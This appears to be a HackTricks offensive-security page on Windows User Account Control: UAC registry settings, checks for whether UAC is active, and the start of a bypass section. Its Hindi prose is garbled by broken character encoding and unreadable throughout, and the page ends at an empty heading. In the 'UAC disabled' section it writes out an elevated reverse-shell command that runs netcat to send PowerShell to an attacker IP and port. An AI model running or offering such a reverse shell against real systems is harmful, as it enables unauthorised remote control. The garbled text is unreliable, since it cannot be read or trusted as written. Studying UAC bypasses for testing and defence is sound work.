# UAC - User Account Control

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪ рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░реЙрдореНрдкреНрдЯ** рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИред рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди `рдЕрдЦрдВрдбрддрд╛` рд╕реНрддрд░ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ **рдЙрдЪреНрдЪ рд╕реНрддрд░** рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдВрджрд┐рдЧреНрдз рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЬрдм UAC рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдФрд░ рдХрд╛рд░реНрдп рд╣рдореЗрд╢рд╛ **рдПрдХ рдЧреИрд░-рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рддреЗ рд╣реИрдВ** рдЬрдм рддрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЗрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ/рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрддрд░ рдХреА рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рди рджреЗрддреЗ рд╣реИрдВред рдпрд╣ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╕реБрдирд┐рддрд┐ рд╣реИ рдЬреЛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рд╕рдВрд░рдЪрд┐рдд рдмрджрд▓рд╛рд╡реЛрдВ рд╕реЗ рдмрдЪрд╛рддреА рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

рдЬрдм UAC рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ 2 рдЯреЛрдХрди рдорд┐рд▓рддреЗ рд╣реИрдВ: рдПрдХ рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреБрдВрдЬреА, рд╕рд╛рдорд╛рдиреНрдп рд╕реНрддрд░ рдХреЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдФрд░ рдПрдХ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред

рдпрд╣ [рдкреГрд╖реНрда](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC рдХрд╛рдо рдХреИрд╕реЗ рдХрд░рддрд╛ рд╣реИ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧрдСрди рдкреНрд░рдХреНрд░рд┐рдпрд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡, рдФрд░ UAC рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрдерд╛рдиреАрдп рд╕реНрддрд░ рдкрд░ (secpol.msc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рдпрд╛ рд╕рдореВрд╣ рдиреАрддрд┐ рд╡рд╕реНрддреБрдУрдВ (GPO) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рдирд┐рдпреЛрдЬрд┐рдд рдФрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдореВрд╣ рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП 10 рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╣реИрдВ рдЬреЛ UAC рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд╛рд▓рд┐рдХрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ:

| рд╕рдореВрд╣ рдиреАрддрд┐ рд╕реЗрдЯрд┐рдВрдЧ                                                                                                                                                                                                                                                                                                                                                           | рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА                | рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

рдХреБрдЫ рдХрд╛рд░реНрдпрдХреНрд░рдо **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрдЪреНрдЪ рдЧрддрд┐ рд╕реНрддрд░ рдкрд░ рдЙрддреНрдкрдиреНрди** рд╣реЛрддреЗ рд╣реИрдВ рдЕрдЧрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдореВрд╣ рдореЗрдВ рд╣реИ**ред рдЗрди рдмрд╛рдЗрдирд░реА рдореЗрдВ рдЙрдирдХреЗ _**рдореИрдирд┐рдлреЗрд╕реНрдЯ**_ рдореЗрдВ _**autoElevate**_ рд╡рд┐рдХрд▓реНрдк рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди _**рд╕рд╣реА**_ рд╣реЛрддрд╛ рд╣реИред рдмрд╛рдЗрдирд░реА рдХреЛ **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди рдХрд┐рдпрд╛** рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдлрд┐рд░, UAC рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдорд╛рдзреНрдпрдо рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рд╕реЗ рдЙрдЪреНрдЪ рдореЗрдВ рдЙрдЪреНрдЪрд┐рддрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП) рдХреБрдЫ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ **рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХреЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдЪреНрдЪ рд╕реНрддрд░ рдХреА рдЕрдЦрдВрдбрддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред

рдЖрдк _**sigcheck.exe**_ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмрд╛рдЗрдирд░реА рдХрд╛ _**рдореИрдирд┐рдлреЗрд╕реНрдЯ**_ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рдЖрдк _Process Explorer_ рдпрд╛ _Process Monitor_ (Sysinternals рдХрд╛) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА **рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

### UAC рдХреА рдЬрд╛рдВрдЪ

UAC рд╕рдХреНрд╖рдо рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
рдпрджрд┐ рдпрд╣ **`1`** рд╣реИ рддреЛ UAC **рд╕рдХреНрд░рд┐рдп** рд╣реИ, рдпрджрд┐ рдпрд╣ **`0`** рд╣реИ рдпрд╛ рдпрд╣ **рдореМрдЬреВрдж рдирд╣реАрдВ** рд╣реИ, рддреЛ UAC **рдирд┐рд╖реНрдХреНрд░рд┐рдп** рд╣реИред

рдлрд┐рд░, рдЬрд╛рдВрдЪреЗрдВ **рдХреМрди рд╕рд╛ рд╕реНрддрд░** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* рдпрджрд┐ **`0`** рд╣реИ рддреЛ, UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рдЬреИрд╕реЗ **рдЕрдХреНрд╖рдо**)
* рдпрджрд┐ **`1`** рд╣реИ рддреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЛ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдкреВрдЫрд╛ рдЬрд╛рддрд╛ рд╣реИ (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`2`** (**рд╣рдореЗрд╢рд╛ рдореБрдЭреЗ рд╕реВрдЪрд┐рдд рдХрд░реЗрдВ**) UAC рд╣рдореЗрд╢рд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдЧрд╛ рдЬрдм рд╡рд╣ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`3`** `1` рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░
* рдпрджрд┐ **`4`** `2` рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░
* рдпрджрд┐ **`5`** (**рдбрд┐рдлрд╝реЙрд▓реНрдЯ**) рдпрд╣ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдЧрд╛ рдХрд┐ рдЧреИрд░ Windows рдмрд╛рдЗрдирд░реА рдХреЛ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП

рдлрд┐рд░, рдЖрдкрдХреЛ **`LocalAccountTokenFilterPolicy`** рдХреЗ рдорд╛рди рдХреА рджреЗрдЦрднрд╛рд▓ рдХрд░рдиреА рд╣реЛрдЧреАред
рдпрджрд┐ рдорд╛рди **`0`** рд╣реИ, рддреЛ рдХреЗрд╡рд▓ **RID 500** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ**) рдХреЗрд╡рд▓ **UAC рдХреЗ рдмрд┐рдирд╛** рдкреНрд░рд╢рд╛рд╕рдХ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдпрджрд┐ рдЗрд╕рдХрд╛ `1` рд╣реИ, **"рдкреНрд░рд╢рд╛рд╕рдХ" рд╕рдореВрд╣ рдХреЗ рд╕рднреА рдЦрд╛рддреЗ** рдЗрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдФрд░, рдЕрдВрддрддрдГ **`FilterAdministratorToken`** рдХреБрдВрдЬреА рдХреЗ рдорд╛рди рдХреА рджреЗрдЦрднрд╛рд▓ рдХрд░реЗрдВред
рдпрджрд┐ **`0`**(рдбрд┐рдлрд╝реЙрд▓реНрдЯ), рддреЛ **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛** рджреВрд░рд╕рдВрдЪрд╛рд░ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ **`1`** рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдЦрд╛рддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ **рджреВрд░рд╕рдВрдЪрд╛рд░ рдХрд╛рд░реНрдп** рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрдм рддрдХ `LocalAccountTokenFilterPolicy` рдХреЛ `1` рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

#### рд╕рд╛рд░рд╛рдВрд╢

* рдпрджрд┐ `EnableLUA=0` рдпрд╛ **рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, **рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА рдХреЛрдИ UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=1` , рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА рдХреЛрдИ UAC рдирд╣реАрдВ**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=0` рдФрд░ `FilterAdministratorToken=0`, RID 500 рдХреЗ рд▓рд┐рдП рдХреЛрдИ UAC рдирд╣реАрдВ (рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ)**
* рдпрджрд┐ `EnableLua=1` рдФрд░ **`LocalAccountTokenFilterPolicy=0` рдФрд░ `FilterAdministratorToken=1`, рд╕рднреА рдХреЗ рд▓рд┐рдП UAC**

рдЗрд╕ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **metasploit** рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХрддреНрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `post/windows/gather/win_privs`

рдЖрдк рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рдореВрд╣реЛрдВ рдХреА рдЬрд╛рдВрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
net user %username%
whoami /groups | findstr Level
```
## UAC рдмрд╛рдпрдкрд╛рд╕

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ UAC рдмрд╛рдпрдкрд╛рд╕ рд╕реАрдзрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЖрдк рдмрд╕ "рд╣рд╛рдБ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

UAC рдмрд╛рдпрдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИ: **UAC рд╕рдХреНрд░рд┐рдп рд╣реИ, рдЖрдкрдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╛рдзреНрдпрдо рдЕрдЦрдВрдбрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ, рдФрд░ рдЖрдкрдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдореВрд╣ рдореЗрдВ рд╣реИ**ред

рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИ рдХрд┐ **рдпрджрд┐ UAC рд╕рд░реНрд╡реЛрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдореЗрдВ рд╣реИ (рд╣рдореЗрд╢рд╛) рддреЛ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдЕрдиреНрдп рд╕реНрддрд░реЛрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдореЗрдВ рд╣реЛрдиреЗ рд╕реЗ рдХрд╣реАрдВ рдЬреНрдпрд╛рджрд╛ рдХрдард┐рди рд╣реИ**ред

### UAC рдирд┐рд╖реЗрдзрд┐рдд

рдпрджрд┐ UAC рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╣реИ (`ConsentPromptBehaviorAdmin` **`0`** рд╣реИ) рддреЛ рдЖрдк **рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░) рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC рдЯреЛрдХрди рдбреБрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде UAC рдмрд╛рдпрдкрд╛рд╕

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **рдмрд╣реБрдд** рдмреЗрд╕рд┐рдХ UAC "рдмрд╛рдпрдкрд╛рд╕" (рдкреВрд░реА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдПрдХреНрд╕реЗрд╕)

